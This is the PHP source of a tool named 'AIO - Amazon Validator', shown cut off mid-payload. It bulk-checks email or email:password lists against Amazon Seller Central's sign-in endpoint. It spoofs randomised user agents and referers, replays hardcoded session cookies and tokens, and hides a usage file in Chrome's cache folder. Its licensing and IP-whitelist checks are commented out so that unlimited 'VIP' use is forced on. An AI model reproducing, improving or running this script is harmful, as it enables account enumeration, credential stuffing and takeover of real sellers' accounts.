<?php
echo '';
ini_set('memory_limit', -1);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
define('OS', strtolower(PHP_OS));
function setConsoleTitle($title)
{
    echo "\033]0;" . $title . "\007";
}
setConsoleTitle('AIO - AMAZON VALIDATOR V.2.6');
function getIPAddress()
{
    $api_url = 'http://ip-api.com/json/';
    $response = file_get_contents($api_url);
    if ($response === false)
    {
        return 'Unable to fetch IP information.';
    }
    $data = json_decode($response, true);
    if (isset($data['status']) && $data['status'] === 'success')
    {
        return $data['query'];
    }
    else
    {
        return 'Failed to retrieve IP address.';
    }
}
$local_ip_address = getIPAddress();
$local_ip_address = trim($local_ip_address);
function getPastebinContent($url)
{
    $context = stream_context_create(['http' => ['timeout' => 10]]);
    $response = @file_get_contents($url, false, $context);
    if ($response === false)
    {
        return false;
    }
    return trim($response);
}
function get_serial_number()
{
    try
    {
        $output = shell_exec('wmic diskdrive get SerialNumber 2>&1');
        if ($output === null)
        {
            throw new Exception('Unable to execute command.');
        }
        $lines = explode("\n", $output);
        $valid_serials = array_filter(array_map('trim', $lines) , function ($line)
        {
            return !empty($line);
        });
        return isset($valid_serials[1]) ? $valid_serials[1] : 'No valid serial number found';
    }
    catch(Exception $e)
    {
        return 'Error: ' . $e->getMessage();
    }
}
/*
$serial_number = get_serial_number();
$hwid = 'AIO' . hash('sha256', PHP_OS . get_current_user() . dechex(crc32(gethostname())) . $serial_number) . '==';
$hwid2 = PHP_OS . get_current_user() . dechex(crc32(gethostname())) . $serial_number;
$hwid_found = false;
$users = '';
$headers = ['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept-Language: en-US,en;q=0.5', 'Connection: keep-alive'];
try
{
    $url = 'https://pastebin.com/raw/uDV55YVu?' . time();
    $opts = ['http' => ['header' => implode("\r\n", $headers) , 'timeout' => 10]];
    $context = stream_context_create($opts);
    $file = file_get_contents($url, false, $context);
    if ($file === false)
    {
        throw new Exception('Unable to fetch data.');
    }
    $stripped = array_map('trim', explode("\n", $file));
}
catch(Exception $e)
{
    echo 'Error: ' . $e->getMessage();
    exit;
}
if (empty($stripped) || (count($stripped) === 1 && trim($stripped[0]) === ''))
{
    echo "[AIO - AMZ VALIDATOR]\n";
    echo "[-] HWID not registered. Access denied.\n";
    file_put_contents('license.lic', $hwid . "\n" . $local_ip_address);
    sleep(5);
    exit;
}
foreach ($stripped as $line)
{
    $split_line = explode(':', $line);
    if (count($split_line) < 2)
    {
        continue;
    }
    [$name, $hwid_in_line] = array_map('trim', $split_line);
    if ($hwid === $hwid_in_line)
    {
        $users = $name;
        $hwid_found = true;
        echo 'License: ' . $hwid . "\n";
        break;
    }
    if ($name === 'TRIAL' && $hwid_in_line === '1')
    {
        echo "\033[93m\033[1m[TRIAL MODE ACTIVATED]\033[0m\n";
        $users = 'TRIAL';
        $hwid_found = true;
        file_put_contents('license.lic', $hwid . "\n" . $local_ip_address);
        break;
    }
}


if (!$hwid_found)
{
    echo "\033[95m[AIO - AMZ VALIDATOR]\033[0m\n";
    echo " [-] HWID not registered. Access denied.\n";
    file_put_contents('license.lic', $hwid . "\n" . $local_ip_address);
    sleep(5);
    exit;
}
$status_url = 'https://pastebin.com/raw/psuMcMr6?' . time();
try
{
    $status_content = trim(getPastebinContent($status_url));
    if ($status_content === false)
    {
        throw new Exception('Failed to retrieve status from server.');
    }
}
catch(Exception $e)
{
    echo "Failed to retrieve status from server.\n";
    echo "\033[31m\033[1m Check your internet connection.\033[0m\n";
    sleep(5);
    exit();
}
if ($status_content === '1')
{*/
    echo " Status:\033[32m\033[1m Online\033[0m\n";
/*}
elseif ($status_content === '0')
{
    echo " Status:\033[31m\033[1m Offline\033[0m\n";
    sleep(5);
    exit();
}
else
{
    echo "\033[31m\033[1m Invalid status ($status_content), please contact Admin.\033[0m\n";
    sleep(5);
    exit();
}
$status_url = 'https://pastebin.com/raw/aBsK1hVD?' . time();
try
{
    $status_content = getPastebinContent($status_url);
    if ($status_content === false)
    {
        throw new Exception('Failed to retrieve status from server.');
    }
    $status_content = trim($status_content);
}
catch(Exception $e)
{
    echo "Failed to retrieve status from server.\n";
    echo "\033[31m\033[1m Check your internet connection.\033[0m\n";
    sleep(5);
    exit();
}
if ($status_content === '2.6')
{*/
    echo " Version: 2.6\n";
/*}
elseif ($status_content === '0')
{
    echo " Version:\033[31m\033[1m Invalid status, please contact Admin.\033[0m\n";
    sleep(5);
    exit();
}
else
{
    echo " Version:\033[31m\033[1m Update Available ($status_content), please contact Admin.\033[0m\n";
    sleep(5);
    exit();
}*/
function getWhitelistIPs($url)
{
    $context = stream_context_create(['http' => ['timeout' => 10]]);
    $response = @file_get_contents($url, false, $context);
    if ($response === false)
    {
        return false;
    }
    return array_filter(array_map('trim', explode("\n", $response)));
}
/*
$pastebin_urlVIP = 'https://pastebin.com/raw/sbSnBqnz?' . time();
$pastebin_urlPrem = 'https://pastebin.com/raw/NnzpGY3q?' . time();
$whitelist_ips_vip = [];
$whitelist_ips_prem = [];
$isVIP = false;
$isTrial = false;
try
{
    $whitelist_ips_vip = array_map('trim', explode("\n", getPastebinContent($pastebin_urlVIP)));
    $whitelist_ips_prem = array_map('trim', explode("\n", getPastebinContent($pastebin_urlPrem)));
    if ($whitelist_ips_vip === false || $whitelist_ips_prem === false)
    {
        throw new Exception('Failed to retrieve whitelist IPs from server.');
    }
    $whitelist_ips_vip = array_filter($whitelist_ips_vip);
    $whitelist_ips_prem = array_filter($whitelist_ips_prem);
}
catch(Exception $e)
{
    echo " Failed to retrieve whitelist IPs from server.\n";
    echo "\033[31m\033[1m Check your internet connection or your IP is not allowed to use this tool.\033[0m\n";
    sleep(5);
    exit();
}
if (!empty($whitelist_ips_vip) && in_array($local_ip_address, $whitelist_ips_vip))
{
    echo " IP Address: $local_ip_address \033[33m\033[1m[VIP]\033[0m\n";
    $isVIP = true;
}
elseif (!empty($whitelist_ips_prem) && in_array($local_ip_address, $whitelist_ips_prem))
{
    echo " IP Address: $local_ip_address \033[36m\033[1m[Premium]\033[0m\n";
}
else
{
    echo " IP Address: $local_ip_address \033[31m\033[1m[Trial]\033[0m\n";
    $isTrial = true;
}
if ($isVIP)
{*/
    echo " Welcome, VIP user! Full features unlocked.\n";
/*}
elseif ($isTrial)
{
    echo " Welcome, Trial user. Limited features apply.\n";
}
else
{
    echo " Welcome, Premium user! Most features unlocked.\n";
}*/
// loading curl libraries
eval(file_get_contents('lib/curl.php'));
eval(file_get_contents('lib/curl.class.php'));
eval(file_get_contents('lib/curl.main.php'));
echo banner();
$isVIP = true;
$isTrial = $isTrial ?? false;
$isPremium = !$isVIP && !$isTrial;
if ($isVIP)
{
    $dailyLimit = 9999999;
}
elseif ($isTrial)
{
    $dailyLimit = 10000;
}
else
{
    $dailyLimit = 600000;
}

$appDataPath = getenv('LOCALAPPDATA');
$usageFile = $appDataPath . "\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data\\data_0.json";
if (!file_exists(dirname($usageFile)))
{
    mkdir(dirname($usageFile) , 0777, true);
}
if (!file_exists($usageFile))
{
    file_put_contents($usageFile, json_encode([]));
}
/*
if (file_exists($usageFile))
{
    exec('attrib -h ' . escapeshellarg($usageFile));
}
*/
$usageData = json_decode(file_get_contents($usageFile) , true);
$today = date('Y-m-d');
if (!isset($usageData[$today]))
{
    $usageData[$today] = ['processed' => 0, ];
}
$processedToday = $usageData[$today]['processed'];
/*if ($processedToday >= $dailyLimit)
{
    echo "[!] Daily limit reached: $processedToday/$dailyLimit items processed." . PHP_EOL;
    exit;
}*/

enterlist : $listname = readline('Enter list : ');
if (empty($listname) || !file_exists($listname))
{
    echo '[?] List not found' . PHP_EOL;
    gotoenterlist;
}
else if ($listname == 'n')
{
    echo '[?] List not found' . PHP_EOL;
    gotoenterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", '', file_get_contents($listname))));
$totalLists = count($lists);
/*
if ($processedToday + $totalLists > $dailyLimit)
{
    $remaining = $dailyLimit - $processedToday;
    echo "[!] You can only process $remaining more items today." . PHP_EOL;
    gotoenterlist;
}*/
$usageData[$today]['processed'] += $totalLists;
file_put_contents($usageFile, json_encode($usageData));
echo "\033[92m[+] List accepted: $totalLists items loaded.\033[0m" . PHP_EOL;
$processedToday += $totalLists;
$remaining = $dailyLimit - $processedToday;
echo "\033[92m[+] Total processed today: $processedToday/$dailyLimit.\033[0m" . PHP_EOL;
$dir = 'aio_results';
if (!is_dir($dir))
{
    mkdir($dir);
}
$today = date('d-m-Y');
$todayDir = $dir . DIRECTORY_SEPARATOR . $today;
if (!is_dir($todayDir))
{
    mkdir($todayDir);
}
chdir($todayDir);
if ($isVIP)
{
    $reqemail = 10;
}
elseif ($isTrial)
{
    $reqemail = 2;
}
else
{
    $reqemail = 5;
}
$no = 0;
$live = 0;
$die = 0;
$recheck = 0;
$c = 0;
$pecah = 10000;
$pecah_list = array_chunk($lists, $pecah);
$tot = count($pecah_list);
function getUserAgents($file)
{
    if (!file_exists($file))
    {
        throw new Exception('user-agent.txt not found.');
    }
    $userAgents = array_map('trim', file($file));
    return array_filter($userAgents);
}
$userAgentFile = __DIR__ . '/user-agent.txt';
$userAgents = [];
try
{
    $userAgents = getUserAgents($userAgentFile);
    if (empty($userAgents))
    {
        throw new Exception('User-Agent list not found.');
    }
}
catch(Exception $e)
{
    echo $e->getMessage() . "\n";
    echo ' Press Enter to exit...';
    exit();
}
$logFile = __DIR__ . '/user-agent.txt.log';
for ($i = 0;$i < $tot;$i++)
{
    $rollingCurl = new \RollingCurl\RollingCurl();
    foreach ($pecah_list[$i] as $list)
    {
        if (file_exists('cookie.txt')) unlink('cookie.txt');
        $c++;
        if (strpos($list, '|') !== false) list($email, $pwd) = explode('|', $list);
        else if (strpos($list, ':') !== false) list($email, $pwd) = explode(':', $list);
        else $email = $list;
        if (empty($email)) continue;
        $email = str_replace(' ', '', $email);
        $domain = 'sellercentral.amazon.com';
        $url = "https://sellercentral.amazon.com/ap/signin?aio=$email&_=" . time() . rand(100, 999);
        $headers = array();
        $headers[] = 'Authority: sellercentral.amazon.com';
        $headers[] = 'Cache-Control: no-cache, no-store, must-revalidate';
        $headers[] = 'Pragma: no-cache';
        $headers[] = 'Expires: 0';
        $headers[] = 'Upgrade-Insecure-Requests: 1';
        $headers[] = 'Origin: https://sellercentral.amazon.com';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 115) . '.0.' . rand(1000, 9999) . '.' . rand(100, 999) . ' Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS ' . rand(13, 16) . '_' . rand(0, 3) . ' like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' . rand(13, 16) . '.' . rand(0, 5) . ' Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_' . rand(13, 15) . '_' . rand(0, 9) . ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 115) . '.0.' . rand(1000, 9999) . '.' . rand(100, 999) . ' Safari/537.36'];
        $randomUserAgent = $userAgents[array_rand($userAgents) ];
        $headers[] = "User-Agent: $randomUserAgent";
        $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
        $headers[] = 'Sec-Fetch-Site: same-origin';
        $headers[] = 'Sec-Fetch-Mode: navigate';
        $headers[] = 'Sec-Fetch-User: ?1';
        $headers[] = 'Sec-Fetch-Dest: document';
        $referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://search.brave.com/', 'https://yep.com/', 'https://www.yahoo.com/', 'https://www.ecosia.org/', 'https://duckduckgo.com/', 'https://www.startpage.com/', 'https://swisscows.com/en', 'https://www.mojeek.com/', 'https://x.com/', 'https://www.slideshare.net/', 'https://www.pinterest.com/', 'https://web.archive.org/', 'https://www.wolframalpha.com/', 'https://www.linkedin.com/', 'https://www.baidu.com/', 'https://yandex.com/', 'https://www.sogou.com/', 'https://www.naver.com/', 'https://www.amazon.com/'];
        $headers[] = 'Referer: ' . $referers[array_rand($referers) ];
        $headers[] = 'Accept-Language: en-US,en;q=0.5';
        $headers[] = 'Accept-Encoding: gzip, deflate, br';
        $headers[] = 'Sec-Ch-Ua: "Chromium";v="' . rand(90, 110) . '", "Not A;Brand";v="99"';
        $headers[] = 'Sec-Ch-Ua-Mobile: ?0';
        $headers[] = 'TSec-Ch-Ua-Platform: "Windows"';
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Upgrade-Insecure-Requests: 1';
        $headers[] = 'TE: trailers';
        $headers[] = 'Cookie: signin-sso-state-us=227b1718-356b-4d44-8c8e-7151e84ef67c; session-id=140-9078825-6369152; ubid-main=134-8353669-9464207; AMCV_A7493BC75245ACD20A490D4D%40AdobeOrg=1585540135%7CMCIDTS%7C20238%7CvVersion%7C4.4.0; cwr_u=abb40705-6c0b-4757-b785-a420e298a55a; ld=SCUSWPDirect; session-token=Obav6rCnmMXZ5nY5b/DOMPMOYAfcTZ82fhX6IlYIAUIkWn8OfsZuSIodcGjYBouauP8yOGKVeGSfypDVPxtR+u717aqUHEtR3jfWuIVQASpXLtP9DaTqJC4Uu1Zx7lO4NfkTHPei4EFBuQy4kiHQt1N+XFHTxcslMhczjrmkMlyBvsF8IZoeYB0/tdfIJMZgP5FThs/a5x/yH+3WNI8Z/8svtfe0Aa6c1WxQLxOQkQ9qnuuR1MFQO6dMVgttEBCqyfUNtxd9AKed4QsR/EdlTDt3qlTmcgYG8x5DR4dzwxLyKeSXSRcX+hhuZdUtZosH/VLl3Issk0I91nNiTBQN1n4/bkC+JsYS; session-id-time=2379272184l; cwr_s=eyJzZXNzaW9uSWQiOiI0OTM4MDhkMy0zYzI2LTQ3ZjktYWUzYi1mMGViOWIxNTc2MWQiLCJyZWNvcmQiOmZhbHNlLCJldmVudENvdW50IjozMSwicGFnZSI6eyJwYWdlSWQiOiIvIiwiaW50ZXJhY3Rpb24iOjAsInJlZmVycmVyIjoiaHR0cHM6Ly9zZWxsZXJjZW50cmFsLmFtYXpvbi5jb20vYXAvc2lnbmluIiwicmVmZXJyZXJEb21haW4iOiJzZWxsZXJjZW50cmFsLmFtYXpvbi5jb20iLCJzdGFydCI6MTc0ODU1MjE5NjY2Mn19; ph_phc_tGCcl9SINhy3N0zy98fdlWrc1ppQ67KJ8pZMzVZOECH_posthog=%7B%22distinct_id%22%3A%2201971dd5-24f5-71c6-9e7a-b3b10d23441b%22%2C%22%24sesid%22%3A%5B1748552199933%2C%2201971dd5-2529-7b39-ae13-d518da3b2041%22%2C1748552197417%5D%7D; id_pkel=n1; id_pk=eyJuIjoiMSJ9; csm-hit=tb:BFD4MZPB07HVDHBDM5XG+s-QJZZZVJ5MGN4NM710KBZ|1748552204605&t:1748552204605&adb:adblk_no';
        $data = "appActionToken=XxcC30I2IHpug9H-zXjsmsr3BrV7TLea7T9_ugjOBl0%3D%3A2&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly9zZWxsZXJjZW50cmFsLmFtYXpvbi5jb20vaG9tZQ%3D%3D&prevRID=ape%3AUzdCU1ZLOEc1VkZKUlZNNVA2SDU%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.5msnyLjyD0TYU6NRJDvVxNuT9tSeNltMHU0-89q0Q5zKTPGaV-f51A.1T5B8HlLWPP7qefU.1yyTUy0DLk4ub1YQ57a2NfZSTC08CtLfxLGTn_PMCTCbnNDq89XQMP9pI5rGXXD2ycUs7-j5fP__qc5Z64dt6I0yG7KODalOxfAxeTxya4dq8CqcPT2xSA6wFbkGUud8eH4mkN6Ahv-DPexpyf0FMNd7XuQbm_NtQGmPNEYkQBDSeSwouyztd8NNhUCBftzxZO7GkSN5K226ZmYu_EHrANAnoyodAZnFDFFPtlY3aShd5tIiLoYQQO1ufyb3tadHUhNqjrx94zIFQskfCYq4NMq4U9MJ4qnBCvXlYuYcv90i_WeIOrZYYqkvZvMgMU0h4CBtd3BuFklgUbyxZfV4P9NELqhO96UlZXttf_Vg_tIiJphcRBQssWrI1tM2E2SGfP44GgOYYUBPCe4SVfrN9mT4F6H4sL8nHZO5_TMfoA0JBceGDDPCo4rYtBZzSx8Q7eVBL9KUzMU0QPLsRqBxdz4drfaTp9uOkoOqAZn2arD-nxdfW90GdI0ywV-Ab_bV6VGGGe-u6k64OrhWzImfIpVDQgC7MP_tSvpgBMgErI8PmXSWqjVWPX5utm0_WrBsJVeIAk2WvTGGN2zEFTQ3l2RQEjCUUfBjpmLxIK2SW6H1c4jBi5gAk15kA5I_ijaS8n7pOXLLQLkQbGjBJG0PvbADSWMi-7u951QEHlaq-kFNYDGgeocF2v_-HJ3duCo7WqltK5OOsY6Oz4vLk5jKGFHXj5fCQKvI.4B6ptvPWa2V15HiF6V5egg&email=$email&password=&create=0&metadata1=ECdITeCs%3A8f%2FsaWucGp1hC2qaTA8CglcOs0svijZT90NmOD5HwyFmUnQx9HXFaWJcxf5PzmTr%2BziKRtkPVrGRT9R3XHf0pnN3XTQPu1bi%2BHNlhp027mHpArQoA88Ik%2F9B0Dz3usHYdV%2Fw9IPpIGY414kL9ZFqagoe8E2ErKbrdBk%2FST4JrzgcAfs3Mzpj4ovtbo3HZMGSpI44Kn18NXrwoiownRzxoj9e%2FU%2BV0S08UQuqAnIUDZLlhEsJpNtIZk9vTyD9WGFJMBVs1WAh9K03r5t2VyxcsL4oHgk2DvQFwmo04nQ%2BY6IuMqicEUpaH0c7ikf8wWDhq56li%2FRJe%2FpPD7DNElAPh81nFYZEWKcUdCX2UvjqUC0kktMXZ9F1WlIGK3LsKhsS%2BwcRk122%2FvUIwOETRzzNd0zwEkLnlzmXrduzpiKhtUQoh3k%2FaXV28D0JxKZNPYkx2DwYm0rw9Hey%2Fq1oPzsEoyo8zxUmUWTut%2FeEB0np2znRTSzCSTETZebBQHfTefPrAit4XPRf8%2BliyvaHbw2g4C%2F7fkF54XdPfBAdZpISr5W2dBQciC1J24fxCQwDPcSDxIVm6H1VkXshnzr3MiEultDAuMzru7%2BbX6NUtI1oyoA%2B0P%2BinVbShBSIW2nG76RSoPkNzuMDhRyShPJdZT6ftUmQNmY5OJ7xP34kn5U8%2BIg%2Fowq5LXH4QSBCJFduiBzh7UBP2ikHjok8OnHxy0eiNqQflTAmXIwGMZOBEO35ULkbbNplVRDz%2FeWKKBVa9HNL4AD5oIJFw3lmB9MzLJvFurZdsJ4HfIYgREaAbJAdohIZ8M6jsVVebWFa7dQlMxb3HHTF%2Bd4Zw%2BBKM95jv0Rl5ICVWs0NOeySTfGgUYVNx%2BKrGMpq7zWaOPhHsLjBzejUiSaZno5KEnIaBxOLVGhMhkhHV2PqflM8b0ppR3Nk4XrmxL1YubOZQ3krtOCaIp9fmgXenSu9DKkxIFHX1HHCRWxOo8x1ztfpJFdy1NczqULwOxp0dNf%2BWg4JFlYZbP9qkvOyRsHo1LgJN2dT4JrIHvewTlOvORdPX3EsDyx6U1cUxdRrOYEOB2s8PMDFRVCHP3kBcr7SD8hqGgqDY%2FzKkKe5LBWO3fAYuA5ovAxtZzEs%2F%2Fsg%2BeuKI3jpF8XzWt8zw2umuQ3WLSIpUp3HetUI7qpnVV6c70P8Qr%2BxiZ21DkNIVPw1PCxKtjKDlFCDPS4odjBYmGE4dteDhgHH5zArg0XVYJPyJM9PEztWL3qu0pLNP03ngmjEuP4VnV6Pi0ao1XcwxoWWo9Al3TTSeUbHLutsapU%2BSjBlYjlOgW15JMpmiV6DmW8%2FVmAk37YqWrWtP8EEWfL%2BEmDiNfUSCZcQ8GWXY4pK03oI%2FJjeqzTBHxvVNjXhCwHx3ZZWi8p%2FvH2LAVLpYI%2FlUb5F%2FMgoSwK47o6j7vr%2BPpR%2FdrYL2NyBjeWx562wgYIRsNP3IHiiqPz1cfP90nXksIxDqsoUKGEjKFbynxU3BzDQBIMY5%2FGqynl%2BlYCj7vMhOBHdOhya2NaWxxVx9EouIiWiqWZNUhwdFjHMmc3qbuCJTuba8%2B%2Fw3971McaQYXAv0KTtDTVyZl6lfxxTjlEJL%2FWjjdvp%2Bnn%2BKdUtV8TlVzkr5l4wSRDEEnJQqJCaB2vy%2FJgp9nN2m4iz9zVAcQZ0mBj%2FL2Jz2Z7rckUVJg%2Brew2Pb8FmrzCZJancSrhaoLSuDd1FD0ZHfDis7jjdXRiJKRE7gfMghAp9GMKQNm6TDt3UxbOfUhlFnWhWK1CHNWmydzreySk8bfysMPl%2F5%2BWoNYGBD5MzJLA1AzzaPmIgomwSQWdqWqSuxztu5Ly7Nd5JjF3qto%2BYytjDNVq4xLa%2FIQBubqdLO6sj7zOc%2FI4GDui2jCmD%2BTPklBsDbNpGK8B3CGDQf4nt9TNGvVOljkATJ5adIRdGIIWng%2FHor29NiT5qEsZe8Sl6pLuOf56%2BN6KM2Cod5E16sz7ab9EfXfM7p8qasmB%2FoNUNYriQhgq3N87ss%2B9HxAoRd930fHYYz0FUQSrW3ktxFJZlDZ8y0yXzJkyJP3ojU1TQ5MHw7DzqkE4IMxbrvuZ%2BczCzf3y%2FSB0lBQMZ8rOmObjjyYL0o69Lewax7c51fdjNkRZCl6S56yxmuZ0GT4ms5AYsxkshVkCuFYTDUyqbGtV8bRRQFNmerZeMj80AskdMGjDflpd6eQLZvoLdcWbF5bsj9GyiJVTiqdgeRZ6OHbD50RHyzTzxQHoBi0X3CsZwjL2ts1oqA%2B9hohb62d%2Fa0qSXRPpScA4fLp6j1gtf4NXokJARXaPPO3ilj3d5zCOSwv53Q2W2Rbu9VTojHb9fYrfD1lCpPVcbVxAi2xo0Y5jIZoG78PHtGAN4eOEGfkZKDZ6kNalrG8z798mJLBVtXxKNgassie7t8I5HGu1JI%2FmczyrISDsXbxeFEgPFnrrR9FJQqN1%2BGQgGCIc5dLO6sRKCAo4%2FPMptPvkxLs2LqMbRmL0ExQ0nvKAJMXEt4PFkfV00cRszb7qKqBA5xd8PMkik17Hm5oYHTJvyKTyMJO2RESvI4c2a2e1D0NJBIFsIfuLemUHlV93LedtkgHwm3BulrdAWQPrElRX%2F6uJrkgzQSSx2ZGwpP0twrq2vMU0s2VtLpTXv3gEzudxoz%2FgKFXHmd3Za6HAmP43%2FxCaCLM2rnsD5aLtg7cXPMKnqpfrL7HyrVyHxeUNoopw11KMzKlYu90u5opgx2kS%2Bq7Dk%2FL8KjeYKnqJFO8eGsqr2E6zR5K5bmgpxVAdTBmXJxohRxPXJeWcs2C7Je2%2BXldhhyQC5yPuuLQkkGEy97Myro4xCp28Tz423OdKc74cnsbjbbYOLTvPh3TYfOLatLirFkSLrxBxFgXjPNkAQeF%2FciKzDpV1Iz5wc1UBvGVlW%2BvvhZ%2F%2BnriPQXILj%2BmSicd4Or0v88XcF%2BR8ExTfSHRSZbgATjQvDNjUN3UrjiXkcQWF6mYiuGSGd%2Fyh%2BkebQ9Lzv%2BVu9WUuZ4%2Be79qsauvBsTYB3qbGNRB5Hl6IEj8abqmw3xh55YrEnEiAp9fkBuh%2BnngK4UsESNhxCurkgsvjjzDdIvAaYlphstm%2FJlsXqobKMbXpoTD%2B%2BdxhlfNIs8z5ltkiQ4Bqjgyd8CszOxM03csey0gKaR2gU7J%2B9U4OKFSuXmRYp5xwCDZL3M93BclYJy82mWpFGXtcBYjbyU9f%2BqMijgUtSY%2FHW87yfiMyO9NVrTEQJ8fj4DJIXaoLcURwB9%2BWbCwOu%2F5n0jOxYh%2BXUX9O3QHYUuFi9bjrMNA%2FluSRmBMZl46%2F%2F%2Fcg9Br2833q8z8jJCtrKM5Tzzd72DATIxG6ubIXaQSHxq6VaFLlsFj4s3tWKDWdGLecXYL4ME%2FXCtETYUVzJKo%2F3uniVPusso904le5WYu4ZHPRFnhr4XFd43SoDziksXG9XG48iYA2pYbz8l9DpTPRz8gY1qPqbmLUYyWinxE8V2e%2Fg0pQogESHkPqozmYk7O6vtGIvtt65pjPu88fbkYt8sPgpXoVaxhlLEDLFPcPOxPscb4YHwcuelEu2srRw8ppt2MjzLuv9pv4S%2FMf65jVJpvwuFSy24hNTPMaHTPhEvj%2FZx2sj5E8fWgTi%2FGIcuz7KXa1mmreNBjnymeioPa8DF4jSO0TJqoaBrrum%2FumKyjM0HZV%2Bx110Fl5jCDf29LHNoQ%2FgheWF57nKJqcuPhGkkOe6az4YBLpTr9HVBBBWBGYBb2x0FwGMShFKdJ1LhMDORwVoHWis4%2FzQJHhkwh6RbHnLubZyLgjl6tazjZIQQwzxRrnVxf4Wq5G22dcgKfWNUxOuXGBqAbjhSZs93Z3odO39LO3hbPgIdKCPNOeFxorNSxRSd9AEVTLv6eD7T%2B2dn8BN8rZMfRKhCXCuPiP6b2pUqsd17EdnKJHRVjGzFXRKMo6f64Z7SKzzL3ztdi5%2FmbktDD4NilooTBsRvdT%2FvI5X5b5hk%2BQdKtArZtugQgSa0BofQwB%2Bho1nRxULgJ%2BPBf3AfyVl1ap2UNBcfITm%2Fc%2FlGJBjwE1%2B4K8vdP2yB8RrNOmlC6J2fNyVTtHB2tCXGZcige%2FWV4hwTuOpP5iRJYf0iueKqNsBpBwweY7FMt8TA0PsTXTsLkhVaa1KqhxJikK1HpCttRWESAIKnqUsk6URS2YL5e%2BxG3RWrDK0juMLWbFzSgF6xLlr%2FrwwTjXYIjq9St06FQF2rmeQuGvKQm7kvLmr4KsK418DM6oFHew6s5xHT7IIPVtu1Z5SkXdvbhq43XKNzetXSyoflazw88HPitdLaOGtl2VgHGxEbjeuFP9YqjJouR03xqXYGXABgm6mliid0kG%2BNcCMtH5T08RUAqMEKASEWuiYI%2Br00N6eDM53gfjAlvD0cSWBK8Oh6t9laGx8nCtUU8OShSPI5kgTXNSl9IUYugS%2F%2Bz5xwEDBxcUIQdmODTlvIrZikC7VL0aUNx5tKB7sp%2BVVCqDJ6nOJ1lGabH67Cn1IoESHcmyMP1YueqAgMWalGqKtJ4etvUPEBC3rzo8XENcgNSPw9nraOoWbTMgGmp20zdWF%2B5NEdSdtysyXhj9LFPsqj%2FrEqCERbzrkqgX3j3eiXw0XPXYJDiZxkmyYJu2YWWUHH7hz%2FTB1tqgzHXshEMbX4VOHHJUn7ut9x0CYKiE7%2FYYjcUO827g8azktuwJ86EvZl64oAnXaZSC%2B1ykSjVQ0RMwT9gt%2F9Oh8fk2m0naweNFcMWBdJi2R8cApV7EgqXq3%2FoNlk%2FfZAJbk64HjS9cV3OenhcLvT2BiUMlYnSNA5oTTVmXcqduFRMBoFo1nysNxKy1gEKgXD8a8p2c5RAvfpwW8Jz7a8DmOJdbI%2Bxy074EOFDdPKV3nm%2FSXtDcSt3QJEGWzDWE%2B4NO4IFl0pQKM7OgY6sxpWS9Tx%2F2BXFRRm5IIYxFCuTUrOl2fN%2BRN4o7%2FRK5b%2BqxAL668%2FaTje0R2fo0zm1lJF2gje%2FgkOYRJHHJKZORRc4BxthbeAJXjYcRjuU4RJKkGgCCNgXXOLy89xdHpxFtsQ%2Bvu5VNDGEEpsJlSFGRJMW2nYUOPFB%2FwwShydd%2BHXpc0irMb2%2FQwcM8gQpXRPbAZ8X8GCtyTp145lO7dxQQzzYXi1Ri4coZw13jRB%2FaxOq0%2BIX3ezbDmgkSPcsqTX5r3%2F7MhGfDTfW1M9FTaTihRgoiyq2m1m8sMFStEi8f0m3B%2B2YrTzizydHBIdZRy9F0ldjrfLXeZBzZV7gkApm59GdzzHq5oR9nqx2GRgtqk2e5RduxjHnjdGr6uovL7GYZvadwd6AncDkRog42QOye0AAr7fD7Gnmk8%2Fg4zY6BVRNFUepPIvyRGgjyRinFa7mdWyuXYpSlfEEtWLEd0nZnMu%2FgjBk68MT0mQUUP6iMzQFdk11QnMrF21EdN1H4idVBJjJKMkZO%2F56NAdEeMxYWztfcUs1NKXTKBfcNV3sXzv%2Bxrc6ebeIaEmjD4qFMbuT6eF3cK8%2F71lcud%2BMSkUeC3j6w7N06e5ooxBLnJtvZBTpOZInU7Rolba2sOCjySmUeVfrm0yqEHhRRpJghFTC%2BoQAipUrXZHtKmbsGLXnBowRYo0hwFCT%2FgK8KAZikNN%2B%2BSyT0LW%2FBZ2TZGDmI1YffYmVFGOOD2uqsB2N3tvFFBpX5x1ndhw60cTfvWaeUEfVhpPGdQq6MzbxLagYtn9xmJezJJo0InRHsDHRCuZjhrazus57tGvkqlIGkO2TkpsJ2Td46E4FNhpQVJzJiCMjcpSiwtu8F8tn3XcbDziWVKnlkZ2lopjJWXtpvi2d2bgw%2BHmz71Hskh0lQ3Vfn%2BhotAQA8N8YQE4GLLQtZkfzerkhzdF7BCviYanYHU4QHdKj1f3BZ6ihzV%2BCxuO72qSybSVkxQq97ML5lqYx6uhzW%2BCZMSYGUo4TDTpyGtwVNOwz0DcvNtG3Yn4NujWoNnfd3%2BcYA%2BznaLCCs4AOsAJkm9b4GmG8xLx7gvW2F%2BxP64LLQu8X3ibxm03ROuwhdaA7GQjZLtXkAzoSvJDgKE4o9zLpwk7L06%2BcvDYIfXo1waV9ddamLqcGTG5Czu5mYQ4G26%2F9sfCLl3qqcyZbItwPJ1jwIg8I3J5pLoEug1CJQk9r1z1mmjj61KSaFqvoK7g2FW0n9ELBMIUkSJFtnCVJx2RkU6bXhv%2BHZaVBcJieJ9KblGWO76%2BuwT8e7x2tiLp0JySMAWBMHX6O%2BepUHUvK%2Fei54gT5t%2BfX%2Fvu5pDv2jV